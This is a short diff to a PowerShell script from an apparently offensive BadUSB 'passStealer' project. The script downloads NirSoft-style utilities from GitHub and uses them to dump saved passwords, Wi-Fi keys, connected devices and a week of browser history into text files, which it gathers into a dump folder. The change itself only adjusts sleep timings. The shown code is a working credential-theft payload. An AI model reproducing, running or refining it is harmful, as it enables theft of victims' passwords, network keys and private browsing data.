@@ -25,9 +25,10 @@ Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/ma
 .\WirelessKeyView.exe /stext wifi.txt
 .\WNetWatcher.exe /stext connected_devices.txt # Create the file for connected devices
 .\BrowsingHistoryView.exe /VisitTimeFilterType 3 7 /stext history.txt # Create the file for browser history 
+Start-Sleep -Seconds 5
 # Wait for the files to be fully written
 while (!(Test-Path "passwords.txt") -or !(Test-Path "wifi.txt")) {
-    Start-Sleep -Seconds 3
+    Start-Sleep -Seconds 1
 }
 
 Move-Item passwords.txt, wifi.txt -Destination "$dumpFolder"
